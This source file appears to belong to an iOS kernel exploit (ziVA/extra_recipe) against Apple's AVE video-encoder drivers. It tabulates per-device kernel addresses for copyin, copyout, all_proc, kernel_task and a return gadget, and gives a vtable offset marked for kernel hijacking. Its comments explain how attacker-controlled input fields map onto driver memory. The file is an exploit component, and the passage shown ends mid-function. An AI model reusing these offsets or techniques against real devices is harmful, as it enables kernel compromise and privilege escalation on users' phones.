#include "offsets.h"

#include <stdio.h>
#include <stdlib.h>
#include <strings.h>
#include <sys/utsname.h>
#include <errno.h>
#import <sys/sysctl.h>
#include <UIKit/UIKit.h>

#include "apple_ave_utils.h"

static offsets_t g_offsets;
static uint64_t g_kernel_base = 0;


/*
 * Function name: 	offsets_get_kernel_base
 * Description:		Gets the kernel base.
 * Returns:			uint64_t.
 */

uint64_t offsets_get_kernel_base() {
    
    return g_kernel_base;
}

/*
 * Function name: 	offsets_set_kernel_base
 * Description:		Sets the kernel base from ziVA and for extra_recipe.
 * Returns:			void.
 */

void offsets_set_kernel_base(uint64_t kernel_base) {
    
    g_kernel_base = kernel_base;
    g_offsets.main_kernel_base = g_kernel_base - g_offsets.kernel_base - g_offsets.kernel_text;
}




/*
 * Function name: 	offsets_get_offsets
 * Description:		Gets the main offsets object.
 * Returns:			offsets_t.
 */

offsets_t offsets_get_offsets() {
    
    return g_offsets;
}

kern_return_t set_driver_offsets (char * driver_name) {
    
    printf("[INFO]: Setting offsets for driver: %s\n", driver_name);

    g_offsets.driver_name = driver_name;

    if(strcmp(driver_name, "AppleAVE2Driver") == 0) {
        
        g_offsets.encode_frame_input_buffer_size = 0x300;
        g_offsets.encode_frame_output_buffer_size = 0x1E8;
        
    } else if(strcmp(driver_name, "AppleVXE380Driver") == 0) {
        
        g_offsets.encode_frame_input_buffer_size = 0x650;
        g_offsets.encode_frame_output_buffer_size = 0x130;
        
    } else if(strcmp(driver_name, "AppleAVEDriver") == 0) {
        
        g_offsets.encode_frame_input_buffer_size = 0x300;
        g_offsets.encode_frame_output_buffer_size = 0x1E8;
        
    } else {
        
        printf("[ERROR]: Driver %s is not supported (yet)", driver_name);
        return KERN_ABORTED;
    }
    
    
    return KERN_SUCCESS;
}

typedef void (*init_func)(void);

void init_default(){
    
    /*
     Find the string "AVE ERROR: SetSessionSettings chroma_format_idc = %d."
     There's only one usage. The branch is being called from the same place.
     There's a check whether 0 <= chroma <= 4, Taken from *(X19 + W8)
     The only call from that branch is just below a lot of memcpys.
     
     Let's say that W8 is 0x4AD0 (our case for that symbol).
     We see that there's a memcpy(X19 + 0x4AA8, X27 + 0x3B70, 0x5AC)
     memcpy((void *)(v9 + 0x4AA8), v16 + 0xEDC, 0x5ACuLL);
     
     Our chroma offset falls within that memcpy.
     So if 0x4AD0 (FFFFFFF0066A0378) is the chroma offset, 0x4AD0 - 0x4AA8 == 0x28.
     The memcpy (FFFFFFF0066A0304) from our controlled input starts at 0x3B70 in that case.
     Therefore the chroma format offset is 0x3B70 + 0x28.
     */
    /*
     memmovea_74(v13 + 0x4AA8, v20 + 0x3B70, 0x5ACLL);
     v32 = *((_DWORD *)v13 + 0x12B4);
     */
    g_offsets.encode_frame_offset_chroma_format_idc = (0x3B70+0x28);
    
    /*
     The same as before goes here, ui32Width is being checked, it has to be > 0xC0
     It just checked just slightly after the chroma format IDC check.
     We see that the memcpy that is responsible for copying ui32Width looks like that:
     memcpy(X19 + 0x194C, X27 + 0xA14) // AVEH7
     
     X28 is ui32Width in our case, which is X19 + 0x194C (FFFFFFF0066A02AC).
     Therefore 0xA14 is ui32Width in our case
     */
    /*
     v30 = v13 + 0x194C;
     *(_DWORD *)v30 <= 0xBFu
     */
    g_offsets.encode_frame_offset_ui32_width = (0xA10+4); // AVEH7: 0xA10+4 - VXE380: ?
    
    /*
     Just the same explanation as before, but instead of 0x194C, 0x1950 is being checked.
     Hence we just increase by 4, because it is being copied by the same memcpy as before.
     */
    g_offsets.encode_frame_offset_ui32_height = (0xA10+8);
    
    /*
     Pretty much the same like before. String reference is "AVE ERROR: SlicesPerFrame  = %d" this time.
     Slices per frame is being checked at offset 0x1CC0.
     The responsible memcpy is memcpy(X19 + 0x1C90, X27 + 0xD58, 0x2E18)
     0x1CC0 - 0x1C90 == 0x30.
     It starts to be copied from our input buffer at offset 0xD58.
     Hence the offset, 0xD58(where our input buffer is being copied) + 0x30(offset from copied dest starting point)
     */
    g_offsets.encode_frame_offset_slice_per_frame = (0xD58+0x30);
    
    /*
     I don't think it's ever going to change..
     */
    g_offsets.encode_frame_offset_info_type = (0x10);
    
    /*
     There are 2 usages of the following string:
     "AVE WARNING: m_PoweredDownWithClientsStillRegistered = true - ask to reset, the HW is in a bad state..."
     One just slightly above an IOMalloc(0x28), one somewhere else.
     Go to the one above the IOMalloc.

     LDR             X0, [X23,#0x11D8] ; 0xfffffff0066a38d0 (AVEH7)
     CBNZ            X0, somewhere
     MOV             W0, #0x28
     BL              _IOMalloc
     STR             X0, [X23,#0x11D8]
     
     The offset is where the IOMalloc put its allocated address.
     */
    g_offsets.encode_frame_offset_iosurface_buffer_mgr = (0x11D8); // 0x11D8: AVEH7
    
    /*
	    Find the following string:
	    "AVE ERROR: IMG_V_EncodeAndSendFrame multiPassEndPassCounterEnc (%d) >= H264VIDEOENCODER_MULTI_PASS_PASSES\n"
	    That's the check that, if not passed, leads to the print of that string:
     LDR             W25, [X22,#0xC]
     CMP             W25, #2
     B.CC            somewhere
     
	    The offset from X22 is what we should put here.
     */
    g_offsets.kernel_address_multipass_end_pass_counter_enc = (0xC);
    
    /*
     There's a string "inputYUV" which is being used twice.
     One time, just above _mach_absolute_time, one time somewhere else.
     Above it, we see the following:
     MOV             W8, #0x4A88
     LDRB            W7, [X19,X8]
     
     Just like before, the X19 is from our memcpy, so we see that the responsible memcpy is:
     memcpy(X19 + 0x1C90, X27 + 0xD58, 0x2E18)
     
     So 0x4A88 - 0x1C90 == 0x2DF8
     So 0x2DF8 + 0xD58(that's where they start copying from our input buffer) == 0x3B50.
     */
    g_offsets.encode_frame_offset_keep_cache = (0x3B50); // AVEH7: 0x3B50
    
    /* IOFence current fences list head in the IOSurface object */
    
    g_offsets.iosurface_current_fences_list_head = 0x210;
    
    g_offsets.struct_proc_p_comm = 0x26C;
    
    g_offsets.struct_proc_p_ucred = 0x100;
    
    g_offsets.struct_kauth_cred_cr_ref = 0x10;
    
    g_offsets.struct_proc_p_uthlist = 0x98;
    
    g_offsets.struct_uthread_uu_ucred = 0x168;
    
    g_offsets.struct_uthread_uu_list = 0x170;
    
    /*
    	IOSurface->lockSurface
    	Find "H264IOSurfaceBuf ERROR: lockSurface failed."
    	Both strings have BLR X8 above them.
    	Find the nearest LDR X8, [something, OFFSET].
    	The OFFSET is mostly 0x98. If something else, then change this.
     */
    g_offsets.iosurface_vtable_offset_kernel_hijack = 0x98;
    
    
    // TODO: Find offsets for each device instead
    g_offsets.main_kernel_base = 0xfffffff000000000;
    g_offsets.kernel_task = 0xfffffff0075c2050 - g_offsets.kernel_base;
    g_offsets.realhost = 0xfffffff007548a98 - g_offsets.kernel_base;
}

void init_RELEASE_ARM64_T8010_1630_37894221() {
    g_offsets.kernel_base = 0xfffffff005e64000;
    g_offsets.l1icachesize_string = 0xfffffff00704b860 - g_offsets.kernel_base;
    g_offsets.osserializer_serialize = 0xfffffff007491a60 - g_offsets.kernel_base;
    g_offsets.kern_proc = 0xfffffff0075f60e0 - g_offsets.kernel_base;
    g_offsets.cachesize_callback = 0xfffffff0073f5814 - g_offsets.kernel_base;
    g_offsets.kernel_base = 0xfffffff005e64000 - g_offsets.kernel_base;
    g_offsets.sysctl_hw_family = 0xfffffff00756e678 - g_offsets.kernel_base;
    g_offsets.ret_gadget = 0xfffffff0063abda0 - g_offsets.kernel_base;
    g_offsets.iofence_vtable_offset = 0xfffffff006e51548 - g_offsets.kernel_base;
    g_offsets.l1dcachesize_handler = 0xfffffff00756e628 - g_offsets.kernel_base;
    g_offsets.l1dcachesize_string = 0xfffffff00704b86d - g_offsets.kernel_base;
    g_offsets.copyin = 0xfffffff0071c857c - g_offsets.kernel_base;
    g_offsets.all_proc = 0xfffffff0075f0478 - g_offsets.kernel_base;
    g_offsets.copyout = 0xfffffff0071c885c - g_offsets.kernel_base;
    g_offsets.panic = 0xfffffff0070efcec - g_offsets.kernel_base;
    g_offsets.quad_format_string = 0xfffffff00705d5d1 - g_offsets.kernel_base;
    g_offsets.null_terminator = 0xfffffff00705e416 - g_offsets.kernel_base;
}
void init_RELEASE_ARM64_S5L8960X_1650_37895227() {
    g_offsets.kernel_base = 0xfffffff006190000;
    g_offsets.l1icachesize_string = 0xfffffff00704ba73 - g_offsets.kernel_base;
    g_offsets.osserializer_serialize = 0xfffffff007441424 - g_offsets.kernel_base;
    g_offsets.kern_proc = 0xfffffff0075a80c8 - g_offsets.kernel_base;
    g_offsets.cachesize_callback = 0xfffffff0073a7878 - g_offsets.kernel_base;
    g_offsets.kernel_base = 0xfffffff006190000 - g_offsets.kernel_base;
    g_offsets.sysctl_hw_family = 0xfffffff00751e320 - g_offsets.kernel_base;
    g_offsets.ret_gadget = 0xfffffff0064d1f70 - g_offsets.kernel_base;
    g_offsets.iofence_vtable_offset = 0xfffffff006f248a0 - g_offsets.kernel_base;
    g_offsets.l1dcachesize_handler = 0xfffffff00751e370 - g_offsets.kernel_base;
    g_offsets.l1dcachesize_string = 0xfffffff00704ba80 - g_offsets.kernel_base;
    g_offsets.copyin = 0xfffffff007181218 - g_offsets.kernel_base;
    g_offsets.all_proc = 0xfffffff0075a26a0 - g_offsets.kernel_base;
    g_offsets.copyout = 0xfffffff00718140c - g_offsets.kernel_base;
    g_offsets.panic = 0xfffffff0070aa818 - g_offsets.kernel_base;
    g_offsets.quad_format_string = 0xfffffff00705ddd1 - g_offsets.kernel_base;
    g_offsets.null_terminator = 0xfffffff00705e3f9 - g_offsets.kernel_base;
}
void init_RELEASE_ARM64_T8010_1650_37895227() {
    g_offsets.kernel_base = 0xfffffff005e1c000;
    g_offsets.l1icachesize_string = 0xfffffff00704ba51 - g_offsets.kernel_base;
    g_offsets.osserializer_serialize = 0xfffffff007486530 - g_offsets.kernel_base;
    g_offsets.kern_proc = 0xfffffff0075ec0c8 - g_offsets.kernel_base;
    g_offsets.cachesize_callback = 0xfffffff0073ec9e0 - g_offsets.kernel_base;
    g_offsets.kernel_base = 0xfffffff005e1c000 - g_offsets.kernel_base;
    g_offsets.sysctl_hw_family = 0xfffffff007562320 - g_offsets.kernel_base;
    g_offsets.ret_gadget = 0xfffffff0063abf70 - g_offsets.kernel_base;
    g_offsets.iofence_vtable_offset = 0xfffffff006e495a0 - g_offsets.kernel_base;
    g_offsets.l1dcachesize_handler = 0xfffffff007562370 - g_offsets.kernel_base;
    g_offsets.l1dcachesize_string = 0xfffffff00704ba5e - g_offsets.kernel_base;
    g_offsets.copyin = 0xfffffff0071c6134 - g_offsets.kernel_base;
    g_offsets.all_proc = 0xfffffff0075e66f0 - g_offsets.kernel_base;
    g_offsets.copyout = 0xfffffff0071c6414 - g_offsets.kernel_base;
    g_offsets.panic = 0xfffffff0070ef8f8 - g_offsets.kernel_base;
    g_offsets.quad_format_string = 0xfffffff00705dda2 - g_offsets.kernel_base;
    g_offsets.null_terminator = 0xfffffff00705e40f - g_offsets.kernel_base;
}
void init_RELEASE_ARM64_T7001_1650_37895227() {
    g_offsets.kernel_base = 0xfffffff006038000;
    g_offsets.l1icachesize_string = 0xfffffff007057a83 - g_offsets.kernel_base;
    g_offsets.osserializer_serialize = 0xfffffff00744d8d0 - g_offsets.kernel_base;
    g_offsets.kern_proc = 0xfffffff0075b40c8 - g_offsets.kernel_base;
    g_offsets.cachesize_callback = 0xfffffff0073b3d24 - g_offsets.kernel_base;
    g_offsets.kernel_base = 0xfffffff006038000 - g_offsets.kernel_base;
    g_offsets.sysctl_hw_family = 0xfffffff00752a320 - g_offsets.kernel_base;
    g_offsets.ret_gadget = 0xfffffff006405f70 - g_offsets.kernel_base;
    g_offsets.iofence_vtable_offset = 0xfffffff006ecd0a0 - g_offsets.kernel_base;
    g_offsets.l1dcachesize_handler = 0xfffffff00752a370 - g_offsets.kernel_base;
    g_offsets.l1dcachesize_string = 0xfffffff007057a90 - g_offsets.kernel_base;
    g_offsets.copyin = 0xfffffff00718d4a0 - g_offsets.kernel_base;
    g_offsets.all_proc = 0xfffffff0075ae7a0 - g_offsets.kernel_base;
    g_offsets.copyout = 0xfffffff00718d694 - g_offsets.kernel_base;
    g_offsets.panic = 0xfffffff0070b69b8 - g_offsets.kernel_base;
    g_offsets.quad_format_string = 0xfffffff007069de1 - g_offsets.kernel_base;
    g_offsets.null_terminator = 0xfffffff00706a40f - g_offsets.kernel_base;
}
void init_RELEASE_ARM64_T7001_1630_37893214() {
    g_offsets.kernel_base = 0xfffffff006070000;
    g_offsets.l1icachesize_string = 0xfffffff007057883 - g_offsets.kernel_base;
    g_offsets.osserializer_serialize = 0xfffffff00745b300 - g_offsets.kernel_base;
    g_offsets.kern_proc = 0xfffffff0075c20e0 - g_offsets.kernel_base;
    g_offsets.cachesize_callback = 0xfffffff0073be4a8 - g_offsets.kernel_base;
    g_offsets.kernel_base = 0xfffffff006070000 - g_offsets.kernel_base;
    g_offsets.sysctl_hw_family = 0xfffffff00753a678 - g_offsets.kernel_base;
    g_offsets.ret_gadget = 0xfffffff006401da0 - g_offsets.kernel_base;
    g_offsets.iofence_vtable_offset = 0xfffffff006ed8748 - g_offsets.kernel_base;
    g_offsets.l1dcachesize_handler = 0xfffffff00753a628 - g_offsets.kernel_base;
    g_offsets.l1dcachesize_string = 0xfffffff007057890 - g_offsets.kernel_base;
    g_offsets.copyin = 0xfffffff00718f840 - g_offsets.kernel_base;
    g_offsets.all_proc = 0xfffffff0075bc528 - g_offsets.kernel_base;
    g_offsets.copyout = 0xfffffff00718fa48 - g_offsets.kernel_base;
    g_offsets.panic = 0xfffffff0070b6dd0 - g_offsets.kernel_base;
    g_offsets.quad_format_string = 0xfffffff007069601 - g_offsets.kernel_base;
    g_offsets.null_terminator = 0xfffffff00706a407 - g_offsets.kernel_base;
}
void init_RELEASE_ARM64_S8000_1630_37893214() {
    g_offsets.kernel_base = 0xfffffff00605c000;
    g_offsets.l1icachesize_string = 0xfffffff00704b885 - g_offsets.kernel_base;
    g_offsets.osserializer_serialize = 0xfffffff00744df5c - g_offsets.kernel_base;
    g_offsets.kern_proc = 0xfffffff0075b20e0 - g_offsets.kernel_base;
    g_offsets.cachesize_callback = 0xfffffff0073b1104 - g_offsets.kernel_base;
    g_offsets.kernel_base = 0xfffffff00605c000 - g_offsets.kernel_base;
    g_offsets.sysctl_hw_family = 0xfffffff00752a678 - g_offsets.kernel_base;
    g_offsets.ret_gadget = 0xfffffff006411da0 - g_offsets.kernel_base;
    g_offsets.iofence_vtable_offset = 0xfffffff006e83b88 - g_offsets.kernel_base;
    g_offsets.l1dcachesize_handler = 0xfffffff00752a628 - g_offsets.kernel_base;
    g_offsets.l1dcachesize_string = 0xfffffff00704b892 - g_offsets.kernel_base;
    g_offsets.copyin = 0xfffffff007182acc - g_offsets.kernel_base;
    g_offsets.all_proc = 0xfffffff0075ac438 - g_offsets.kernel_base;
    g_offsets.copyout = 0xfffffff007182cd4 - g_offsets.kernel_base;
    g_offsets.panic = 0xfffffff0070aabb0 - g_offsets.kernel_base;
    g_offsets.quad_format_string = 0xfffffff00705d603 - g_offsets.kernel_base;
    g_offsets.null_terminator = 0xfffffff00705e409 - g_offsets.kernel_base;
}
void init_RELEASE_ARM64_T7000_1630_37894221() {
    g_offsets.kernel_base = 0xfffffff006144000;
    g_offsets.l1icachesize_string = 0xfffffff007057883 - g_offsets.kernel_base;
    g_offsets.osserializer_serialize = 0xfffffff00745b100 - g_offsets.kernel_base;
    g_offsets.kern_proc = 0xfffffff0075c20e0 - g_offsets.kernel_base;
    g_offsets.cachesize_callback = 0xfffffff0073be2a8 - g_offsets.kernel_base;
    g_offsets.kernel_base = 0xfffffff006144000 - g_offsets.kernel_base;
    g_offsets.sysctl_hw_family = 0xfffffff00753a678 - g_offsets.kernel_base;
    g_offsets.ret_gadget = 0xfffffff0064b9da0 - g_offsets.kernel_base;
    g_offsets.iofence_vtable_offset = 0xfffffff006ef9688 - g_offsets.kernel_base;
    g_offsets.l1dcachesize_handler = 0xfffffff00753a628 - g_offsets.kernel_base;
    g_offsets.l1dcachesize_string = 0xfffffff007057890 - g_offsets.kernel_base;
    g_offsets.copyin = 0xfffffff00718f76c - g_offsets.kernel_base;
    g_offsets.all_proc = 0xfffffff0075bc468 - g_offsets.kernel_base;
    g_offsets.copyout = 0xfffffff00718f974 - g_offsets.kernel_base;
    g_offsets.panic = 0xfffffff0070b6dd0 - g_offsets.kernel_base;
    g_offsets.quad_format_string = 0xfffffff007069601 - g_offsets.kernel_base;
    g_offsets.null_terminator = 0xfffffff00706a407 - g_offsets.kernel_base;
}
// iPad Air
void init_RELEASE_ARM64_S5L8960X_1630_37893214() {
    g_offsets.kernel_base = 0xfffffff006194000;
    g_offsets.l1icachesize_string = 0xfffffff00704b893 - g_offsets.kernel_base;
    g_offsets.osserializer_serialize = 0xfffffff00744ee4c - g_offsets.kernel_base;
    g_offsets.kern_proc = 0xfffffff0075b60e0 - g_offsets.kernel_base;
    g_offsets.cachesize_callback = 0xfffffff0073b1ff4 - g_offsets.kernel_base;
    g_offsets.kernel_base = 0xfffffff0061bc000 - g_offsets.kernel_base;
    g_offsets.sysctl_hw_family = 0xfffffff00752e678 - g_offsets.kernel_base;
    g_offsets.ret_gadget = 0xfffffff0064c1da0 - g_offsets.kernel_base;
    g_offsets.iofence_vtable_offset = 0xfffffff006f2bd88 - g_offsets.kernel_base;
    g_offsets.l1dcachesize_handler = 0xfffffff00752e628 - g_offsets.kernel_base;
    g_offsets.l1dcachesize_string = 0xfffffff00704b8a0 - g_offsets.kernel_base;
    g_offsets.copyin = 0xfffffff0071835b8 - g_offsets.kernel_base;
    g_offsets.all_proc = 0xfffffff0075b0418 - g_offsets.kernel_base;
    g_offsets.copyout = 0xfffffff0071837c0 - g_offsets.kernel_base;
    g_offsets.panic = 0xfffffff0070aac30 - g_offsets.kernel_base;
    g_offsets.quad_format_string = 0xfffffff00705d611 - g_offsets.kernel_base;
    g_offsets.null_terminator = 0xfffffff00705e411 - g_offsets.kernel_base;
}
void init_RELEASE_ARM64_T7000_1650_37895227() {
    g_offsets.kernel_base = 0xfffffff006118000;
    g_offsets.l1icachesize_string = 0xfffffff007057a83 - g_offsets.kernel_base;
    g_offsets.osserializer_serialize = 0xfffffff00744d6ac - g_offsets.kernel_base;
    g_offsets.kern_proc = 0xfffffff0075b40c8 - g_offsets.kernel_base;
    g_offsets.cachesize_callback = 0xfffffff0073b3b00 - g_offsets.kernel_base;
    g_offsets.kernel_base = 0xfffffff006118000 - g_offsets.kernel_base;
    g_offsets.sysctl_hw_family = 0xfffffff00752a320 - g_offsets.kernel_base;
    g_offsets.ret_gadget = 0xfffffff0064c9f70 - g_offsets.kernel_base;
    g_offsets.iofence_vtable_offset = 0xfffffff006ef20e0 - g_offsets.kernel_base;
    g_offsets.l1dcachesize_handler = 0xfffffff00752a370 - g_offsets.kernel_base;
    g_offsets.l1dcachesize_string = 0xfffffff007057a90 - g_offsets.kernel_base;
    g_offsets.copyin = 0xfffffff00718d3a8 - g_offsets.kernel_base;
    g_offsets.all_proc = 0xfffffff0075ae6e0 - g_offsets.kernel_base;
    g_offsets.copyout = 0xfffffff00718d59c - g_offsets.kernel_base;
    g_offsets.panic = 0xfffffff0070b69b8 - g_offsets.kernel_base;
    g_offsets.quad_format_string = 0xfffffff007069de1 - g_offsets.kernel_base;
    g_offsets.null_terminator = 0xfffffff00706a40f - g_offsets.kernel_base;
}
void init_RELEASE_ARM64_S8000_1650_37895227() {
    g_offsets.kernel_base = 0xfffffff00601c000;
    g_offsets.l1icachesize_string = 0xfffffff00704ba85 - g_offsets.kernel_base;
    g_offsets.osserializer_serialize = 0xfffffff00744053c - g_offsets.kernel_base;
    g_offsets.kern_proc = 0xfffffff0075a40c8 - g_offsets.kernel_base;
    g_offsets.cachesize_callback = 0xfffffff0073a6990 - g_offsets.kernel_base;
    g_offsets.kernel_base = 0xfffffff00601c000 - g_offsets.kernel_base;
    g_offsets.sysctl_hw_family = 0xfffffff00751a320 - g_offsets.kernel_base;
    g_offsets.ret_gadget = 0xfffffff006411f70 - g_offsets.kernel_base;
    g_offsets.iofence_vtable_offset = 0xfffffff006e7bd60 - g_offsets.kernel_base;
    g_offsets.l1dcachesize_handler = 0xfffffff00751a370 - g_offsets.kernel_base;
    g_offsets.l1dcachesize_string = 0xfffffff00704ba92 - g_offsets.kernel_base;
    g_offsets.copyin = 0xfffffff007180720 - g_offsets.kernel_base;
    g_offsets.all_proc = 0xfffffff00759e6c0 - g_offsets.kernel_base;
    g_offsets.copyout = 0xfffffff007180914 - g_offsets.kernel_base;
    g_offsets.panic = 0xfffffff0070aa798 - g_offsets.kernel_base;
    g_offsets.quad_format_string = 0xfffffff00705dde3 - g_offsets.kernel_base;
    g_offsets.null_terminator = 0xfffffff00705e411 - g_offsets.kernel_base;
}
void init_RELEASE_ARM64_T7001_1630_37894221() {
    g_offsets.kernel_base = 0xfffffff006070000;
    g_offsets.l1icachesize_string = 0xfffffff007057883 - g_offsets.kernel_base;
    g_offsets.osserializer_serialize = 0xfffffff00745b324 - g_offsets.kernel_base;
    g_offsets.kern_proc = 0xfffffff0075c20e0 - g_offsets.kernel_base;
    g_offsets.cachesize_callback = 0xfffffff0073be4cc - g_offsets.kernel_base;
    g_offsets.kernel_base = 0xfffffff006070000 - g_offsets.kernel_base;
    g_offsets.sysctl_hw_family = 0xfffffff00753a678 - g_offsets.kernel_base;
    g_offsets.ret_gadget = 0xfffffff006401da0 - g_offsets.kernel_base;
    g_offsets.iofence_vtable_offset = 0xfffffff006ed8748 - g_offsets.kernel_base;
    g_offsets.l1dcachesize_handler = 0xfffffff00753a628 - g_offsets.kernel_base;
    g_offsets.l1dcachesize_string = 0xfffffff007057890 - g_offsets.kernel_base;
    g_offsets.copyin = 0xfffffff00718f864 - g_offsets.kernel_base;
    g_offsets.all_proc = 0xfffffff0075bc528 - g_offsets.kernel_base;
    g_offsets.copyout = 0xfffffff00718fa6c - g_offsets.kernel_base;
    g_offsets.panic = 0xfffffff0070b6dd0 - g_offsets.kernel_base;
    g_offsets.quad_format_string = 0xfffffff007069601 - g_offsets.kernel_base;
    g_offsets.null_terminator = 0xfffffff00706a407 - g_offsets.kernel_base;
}
void init_RELEASE_ARM64_S5L8960X_1630_37894221() {
    g_offsets.kernel_base = 0xfffffff0061bc000;
    g_offsets.l1icachesize_string = 0xfffffff00704b893 - g_offsets.kernel_base;
    g_offsets.osserializer_serialize = 0xfffffff00744ee70 - g_offsets.kernel_base;
    g_offsets.kern_proc = 0xfffffff0075b60e0 - g_offsets.kernel_base;
    g_offsets.cachesize_callback = 0xfffffff0073b2018 - g_offsets.kernel_base;
    g_offsets.kernel_base = 0xfffffff0061bc000 - g_offsets.kernel_base;
    g_offsets.sysctl_hw_family = 0xfffffff00752e678 - g_offsets.kernel_base;
    g_offsets.ret_gadget = 0xfffffff0064c1da0 - g_offsets.kernel_base;
    g_offsets.iofence_vtable_offset = 0xfffffff006f2bd88 - g_offsets.kernel_base;
    g_offsets.l1dcachesize_handler = 0xfffffff00752e628 - g_offsets.kernel_base;
    g_offsets.l1dcachesize_string = 0xfffffff00704b8a0 - g_offsets.kernel_base;
    g_offsets.copyin = 0xfffffff0071835dc - g_offsets.kernel_base;
    g_offsets.all_proc = 0xfffffff0075b0418 - g_offsets.kernel_base;
    g_offsets.copyout = 0xfffffff0071837e4 - g_offsets.kernel_base;
    g_offsets.panic = 0xfffffff0070aac30 - g_offsets.kernel_base;
    g_offsets.quad_format_string = 0xfffffff00705d611 - g_offsets.kernel_base;
    g_offsets.null_terminator = 0xfffffff00705e411 - g_offsets.kernel_base;
}
void init_RELEASE_ARM64_T8010_1630_37893214() {
    g_offsets.kernel_base = 0xfffffff005e64000;
    g_offsets.l1icachesize_string = 0xfffffff00704b860 - g_offsets.kernel_base;
    g_offsets.osserializer_serialize = 0xfffffff007491a3c - g_offsets.kernel_base;
    g_offsets.kern_proc = 0xfffffff0075f60e0 - g_offsets.kernel_base;
    g_offsets.cachesize_callback = 0xfffffff0073f57f0 - g_offsets.kernel_base;
    g_offsets.kernel_base = 0xfffffff005e64000 - g_offsets.kernel_base;
    g_offsets.sysctl_hw_family = 0xfffffff00756e678 - g_offsets.kernel_base;
    g_offsets.ret_gadget = 0xfffffff0063abda0 - g_offsets.kernel_base;
    g_offsets.iofence_vtable_offset = 0xfffffff006e51548 - g_offsets.kernel_base;
    g_offsets.l1dcachesize_handler = 0xfffffff00756e628 - g_offsets.kernel_base;
    g_offsets.l1dcachesize_string = 0xfffffff00704b86d - g_offsets.kernel_base;
    g_offsets.copyin = 0xfffffff0071c8558 - g_offsets.kernel_base;
    g_offsets.all_proc = 0xfffffff0075f0478 - g_offsets.kernel_base;
    g_offsets.copyout = 0xfffffff0071c8838 - g_offsets.kernel_base;
    g_offsets.panic = 0xfffffff0070efcec - g_offsets.kernel_base;
    g_offsets.quad_format_string = 0xfffffff00705d5d1 - g_offsets.kernel_base;
    g_offsets.null_terminator = 0xfffffff00705e416 - g_offsets.kernel_base;
}
void init_RELEASE_ARM64_T7000_1630_37893214() {
    g_offsets.kernel_base = 0xfffffff0060cc000;
    g_offsets.l1icachesize_string = 0xfffffff007057883 - g_offsets.kernel_base;
    g_offsets.osserializer_serialize = 0xfffffff00745b0dc - g_offsets.kernel_base;
    g_offsets.kern_proc = 0xfffffff0075c20e0 - g_offsets.kernel_base;
    g_offsets.cachesize_callback = 0xfffffff0073be284 - g_offsets.kernel_base;
    g_offsets.kernel_base = 0xfffffff0060cc000 - g_offsets.kernel_base;
    g_offsets.sysctl_hw_family = 0xfffffff00753a678 - g_offsets.kernel_base;
    g_offsets.ret_gadget = 0xfffffff006455da0 - g_offsets.kernel_base;
    g_offsets.iofence_vtable_offset = 0xfffffff006ef4b08 - g_offsets.kernel_base;
    g_offsets.l1dcachesize_handler = 0xfffffff00753a628 - g_offsets.kernel_base;
    g_offsets.l1dcachesize_string = 0xfffffff007057890 - g_offsets.kernel_base;
    g_offsets.copyin = 0xfffffff00718f748 - g_offsets.kernel_base;
    g_offsets.all_proc = 0xfffffff0075bc468 - g_offsets.kernel_base;
    g_offsets.copyout = 0xfffffff00718f950 - g_offsets.kernel_base;
    g_offsets.panic = 0xfffffff0070b6dd0 - g_offsets.kernel_base;
    g_offsets.quad_format_string = 0xfffffff007069601 - g_offsets.kernel_base;
    g_offsets.null_terminator = 0xfffffff00706a407 - g_offsets.kernel_base;
}
void init_RELEASE_ARM64_S8000_1630_37894221() {
    g_offsets.kernel_base = 0xfffffff00605c000;
    g_offsets.l1icachesize_string = 0xfffffff00704b885 - g_offsets.kernel_base;
    g_offsets.osserializer_serialize = 0xfffffff00744df80 - g_offsets.kernel_base;
    g_offsets.kern_proc = 0xfffffff0075b20e0 - g_offsets.kernel_base;
    g_offsets.cachesize_callback = 0xfffffff0073b1128 - g_offsets.kernel_base;
    g_offsets.kernel_base = 0xfffffff00605c000 - g_offsets.kernel_base;
    g_offsets.sysctl_hw_family = 0xfffffff00752a678 - g_offsets.kernel_base;
    g_offsets.ret_gadget = 0xfffffff006411da0 - g_offsets.kernel_base;
    g_offsets.iofence_vtable_offset = 0xfffffff006e83b88 - g_offsets.kernel_base;
    g_offsets.l1dcachesize_handler = 0xfffffff00752a628 - g_offsets.kernel_base;
    g_offsets.l1dcachesize_string = 0xfffffff00704b892 - g_offsets.kernel_base;
    g_offsets.copyin = 0xfffffff007182af0 - g_offsets.kernel_base;
    g_offsets.all_proc = 0xfffffff0075ac438 - g_offsets.kernel_base;
    g_offsets.copyout = 0xfffffff007182cf8 - g_offsets.kernel_base;
    g_offsets.panic = 0xfffffff0070aabb0 - g_offsets.kernel_base;
    g_offsets.quad_format_string = 0xfffffff00705d603 - g_offsets.kernel_base;
    g_offsets.null_terminator = 0xfffffff00705e409 - g_offsets.kernel_base;
}

/*
 * Function name: 	offsets_get_os_build_version
 * Description:		Gets a string with the OS's build version.
 * Returns:			kern_return_t and os build version in output param.
 */

static
kern_return_t offsets_get_os_build_version(char * os_build_version) {
    
    kern_return_t ret = KERN_SUCCESS;
    int mib[2] = {CTL_KERN, KERN_OSVERSION};
    uint32_t namelen = sizeof(mib) / sizeof(mib[0]);
    size_t buffer_size = 0;
    char * errno_str = NULL;
    
    ret = sysctl(mib, namelen, NULL, &buffer_size, NULL, 0);
    
    if (KERN_SUCCESS != ret)
    {
        errno_str = strerror(errno);
        printf("[ERROR]: getting OS version's buffer size: %s", errno_str);
        goto cleanup;
    }
    
    ret = sysctl(mib, namelen, os_build_version, &buffer_size, NULL, 0);
    if (KERN_SUCCESS != ret)
    {
        errno_str = strerror(errno);
        printf("[ERROR]: getting OS version: %s", errno_str);
        goto cleanup;
    }
    
cleanup:
    return ret;
}

/*
 * Function name: 	offsets_get_device_type_and_version
 * Description:		Gets the device type and version.
 * Returns:			kern_return_t and data in output params.
 */

static
kern_return_t offsets_get_device_type_and_version(char * machine, char * build) {
    
    kern_return_t ret = KERN_SUCCESS;
    struct utsname u;
    char os_build_version[0x100] = {0};
    
    memset(&u, 0, sizeof(u));
    
    ret = uname(&u);
    if (ret)
    {
        printf("[ERROR]: uname-ing");
        goto cleanup;
    }
    
    ret = offsets_get_os_build_version(os_build_version);
    if (KERN_SUCCESS != ret) {
        printf("[ERROR]: getting OS Build version!");
        goto cleanup;
    }
    
    strcpy(machine, u.machine);
    strcpy(build, os_build_version);
    
cleanup:
    return ret;
}


/*
 * Function name: 	offsets_determine_initializer_for_device_and_build
 * Description:		Determines which function should be used as an initializer for the device and build given.
 * Returns:			kern_return_t and func pointer as an output param.
 */

static
kern_return_t offsets_determine_initializer_for_device_and_build(char * device, char * build, init_func * func) {
    
    kern_return_t ret = KERN_INVALID_HOST;
    
    struct utsname u = { 0 };
    uname(&u);
    
